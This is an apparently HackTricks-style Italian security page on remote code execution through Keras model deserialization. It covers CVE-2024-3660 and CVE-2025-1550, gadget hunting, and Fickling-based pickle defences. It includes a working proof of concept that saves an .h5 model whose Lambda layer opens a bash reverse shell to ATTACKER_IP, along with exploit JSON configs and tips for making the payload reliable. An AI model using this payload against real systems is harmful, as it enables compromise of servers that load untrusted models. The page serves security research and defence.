# RCE durante la deserializzazione dei modelli Keras e ricerca di gadget

Questa pagina riassume le tecniche pratiche di exploitation contro la pipeline di deserializzazione dei modelli Keras, spiega gli interni e la attack surface del formato nativo .keras e fornisce un toolkit per ricercatori finalizzato all'individuazione di Model File Vulnerabilities (MFV) e gadget post-fix.

## Interni del formato dei modelli .keras

Un file .keras è un archivio ZIP che contiene almeno:<sup>[[1]](#references)</sup>
- metadata.json – informazioni generiche (ad esempio, la versione di Keras)
- config.json – architettura del modello (attack surface primaria)
- model.weights.h5 – pesi in HDF5

Il file config.json controlla la deserializzazione ricorsiva: Keras importa moduli, risolve classi/funzioni e ricostruisce layer/oggetti a partire da dizionari controllati dall'attacker.<sup>[[1]](#references)</sup>

Esempio di snippet per un oggetto layer Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La deserializzazione esegue:<sup>[[1]](#references)</sup>
- Importazione dei moduli e risoluzione dei simboli dalle chiavi module/class_name
- Invocazione di from_config(...) o del costruttore con kwargs controllati dall'attaccante
- Ricorsione negli oggetti annidati (activations, initializers, constraints, ecc.)

Storicamente, ciò esponeva tre primitive a un attaccante che crea config.json:<sup>[[1]](#references)</sup>
- Controllo dei moduli importati
- Controllo delle classi/funzioni risolte
- Controllo dei kwargs passati ai costruttori/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa principale:
- La deserializzazione legacy di Lambda ricostruiva una funzione Python a partire da codice marshaled controllato dall'attaccante: `func_load()` esegue il base64-decode del payload, chiama `marshal.loads()` e crea un `FunctionType`. Il bytecode della funzione risultante viene eseguito quando Lambda viene invocato, e i loader interessati precedenti alla versione 2.13 non applicavano i controlli safe-mode per i formati legacy.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

In un archivio Keras v3 nativo, la funzione Lambda è rappresentata come un oggetto `__lambda__` il cui campo `code` contiene codice marshaled codificato in base64:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigazione:
- Keras applica `safe_mode=True` per impostazione predefinita per il formato nativo Keras v3. Le lambda Python serializzate in `Lambda` vengono bloccate, a meno che l'utente non scelga esplicitamente di disabilitare questa protezione con `safe_mode=False`; questa protezione non copre i formati legacy allo stesso modo.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Note:
- I formati legacy (salvataggi HDF5 meno recenti) o i codebase più vecchi potrebbero non applicare i controlli moderni, quindi gli attacchi di tipo “downgrade” possono ancora essere applicabili quando le vittime usano loader meno recenti.

## CVE-2025-1550 – Importazione arbitraria di moduli in Keras 3.0.0–3.8.x

Causa principale:
- `_retrieve_class_or_fn` usava `importlib.import_module(module)` su stringhe di moduli controllate dall'attaccante provenienti da `config.json`.
- Impatto: un archivio `.keras` appositamente predisposto poteva fare in modo che `Model.load_model()` importasse moduli e funzioni Python scelti dall'attaccante, con side effect al momento dell'importazione e argomenti controllati dall'attaccante, anche con `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Idea dell'exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Miglioramenti di sicurezza (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: le importazioni sono limitate ai moduli ufficiali dell'ecosistema: keras, keras_hub, keras_cv, keras_nlp
- Safe mode predefinito: safe_mode=True blocca il caricamento di funzioni serializzate non sicure delle Lambda
- Controllo di tipo di base: gli oggetti deserializzati devono corrispondere ai tipi previsti

## Exploitation pratica: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Le implementazioni legacy di TensorFlow-Keras potrebbero ancora accettare file di modelli HDF5 (`.h5`). Se un attacker può caricare un modello che il server carica successivamente o su cui esegue l'inferenza, un loader vulnerabile può deserializzare un layer Lambda contenente codice Python controllato dall'attacker, che può quindi essere eseguito nel workflow del modello dell'applicazione.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC minimo per creare un file .h5 malevolo la cui Lambda esegue una reverse shell quando il target invoca il modello:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Note e suggerimenti sull'affidabilità:
- I punti di attivazione variano in base al formato e al workflow; il write-up citato ha osservato l'esecuzione del payload due volte durante la predizione. Considera gli side effect come ripetibili e rendi i payload idempotenti.<sup>[[7]](#references)</sup>
- Version pinning: allinea TF/Keras/Python della vittima per evitare mismatch nella serializzazione. Ad esempio, crea gli artifact con Python 3.8 e TensorFlow 2.13.1 se è quello utilizzato dal target.<sup>[[7]](#references)</sup>
- Replica rapida dell'ambiente:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validazione: un payload benigno come os.system("ping -c 1 YOUR_IP") aiuta a confermare l'esecuzione (ad esempio, osservando il traffico ICMP con tcpdump) prima di passare a una reverse shell.<sup>[[7]](#references)</sup>

## Superficie dei gadget post-fix all'interno dell'allowlist

Anche con l'allowlist dei moduli Keras e la safe mode, i callable consentiti possono esporre effetti collaterali. Ad esempio, `keras.utils.get_file` scarica un URL e lo scrive nella posizione di cache configurata, rendendolo un candidato per l'analisi dei gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Configurazione Lambda candidata (convalidare la firma della chiamata in un test controllato):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitazione importante:
- `Lambda.call()` passa sempre l'input del modello come primo argomento posizionale e gli `arguments` configurati come argomenti keyword. Per `get_file`, quel valore posizionale riempie `fname`; una mancata corrispondenza tra tensor e path può far fallire questo candidato prima di qualsiasi download, quindi non è un gadget funzionante garantito.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting degli import pickle per modelli AI/ML (Fickling)

Molti formati di modelli AI/ML (file `.pt`/`.pth`/`.ckpt` di PyTorch, artefatti joblib/scikit-learn e altri formati nativi Python) incorporano dati Python pickle. Il precedente percorso Keras Lambda utilizza invece bytecode di funzioni marshaled, quindi costituisce un rischio di deserializzazione separato. Gli opcode pickle possono invocare comportamenti controllati dall'attaccante durante la deserializzazione, inclusi la manomissione del modello o l'RCE, e gli scanner semplici possono non rilevare import pericolosi nuovi o non presenti nell'elenco.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Una difesa pratica fail-closed consiste nell'intercettare il deserializzatore pickle di Python e consentire solo un insieme verificato di import innocui relativi al machine learning durante l'unpickling. Fickling di Trail of Bits implementa questa policy e include un allowlist ML curato, creato a partire da migliaia di pickle pubblici di Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modello di sicurezza per gli import “sicuri” (intuizioni derivate dalla ricerca e dalla pratica): i simboli importati utilizzati da un pickle devono contemporaneamente:<sup>[[8]](#references)</sup>
- Non eseguire codice né causare esecuzioni (nessun oggetto di codice compilato o sorgente, esecuzione di comandi shell, hook, ecc.)
- Non ottenere/impostare attributi o elementi arbitrari
- Non importare né ottenere riferimenti ad altri oggetti Python dalla VM pickle
- Non attivare deserializzatori secondari (ad es. marshal, pickle annidati), neanche indirettamente

Abilita le protezioni di Fickling il prima possibile durante l'avvio del processo, in modo che qualsiasi caricamento pickle eseguito dai framework (`torch.load`, `joblib.load`, ecc.) venga verificato:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Suggerimenti operativi:
- Puoi disabilitare/riabilitare temporaneamente gli hook dove necessario:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se un modello noto come affidabile viene bloccato, estendi l'allowlist per il tuo ambiente dopo aver esaminato i simboli:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling espone anche guardie runtime generiche, se preferisci un controllo più granulare:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() per imporre i controlli a tutti i pickle.load()
- with fickling.check_safety(): per un’imposizione limitata all’ambito
- fickling.load(path) / fickling.is_likely_safe(path) per controlli una tantum

- Quando possibile, preferisci formati di modello non-pickle (ad esempio, SafeTensors).<sup>[[15]](#references)</sup> Se devi accettare pickle, esegui i loader con il minimo privilegio, senza network egress, e applica l’allowlist.

Questa strategia allowlist-first blocca in modo dimostrabile i comuni percorsi di exploit ML basati su pickle, mantenendo al contempo un’elevata compatibilità. Nel benchmark di ToB, Fickling ha rilevato il 100% dei file sintetici malevoli e ha consentito circa il 99% dei file puliti provenienti dai principali repository Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit per ricercatori

1) Scoperta sistematica dei gadget nei moduli consentiti

Enumera i callable candidati tra keras, keras_nlp, keras_cv, keras_hub e assegna priorità a quelli con effetti collaterali su file/network/process/env.<sup>[[1]](#references)</sup>

<details>
<summary>Enumera i callable potenzialmente pericolosi nei moduli Keras presenti nell’allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Test diretto della deserializzazione (non è necessario alcun archivio .keras)

Fornisci dizionari appositamente creati direttamente ai deserializzatori Keras per apprendere i parametri accettati e osservare gli effetti collaterali.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Probing tra versioni e formati

Keras esiste in più codebase/epoche, con guardrail e formati diversi:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, destinato alla rimozione)
- tf-keras: mantenuto separatamente
- Multi-backend Keras 3 (ufficiale): ha introdotto il formato nativo .keras

Ripetere i test tra codebase e formati (.keras rispetto al legacy HDF5) per individuare regressioni o guardrail mancanti.

## References

- [1] [Ricerca di vulnerabilità nella deserializzazione dei modelli Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Aggiunti controlli alla serializzazione](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE tramite deserializzazione di Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Import arbitrario di moduli Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [report huntr – import arbitrario #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [report huntr – import arbitrario #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE Lambda di TensorFlow .h5 fino a root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [blog Trail of Bits – Il nuovo scanner di file pickle AI/ML di Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Protezione degli ambienti AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus di benchmark per la scansione pickle di Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Background sugli attacchi Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Progetto SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – I Keras 2 Lambda Layers consentono l'iniezione di codice arbitrario](https://kb.cert.org/vuls/id/253266)
- [17] [Codice sorgente del Keras Lambda layer (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Codice sorgente delle utility Python di Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` di Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
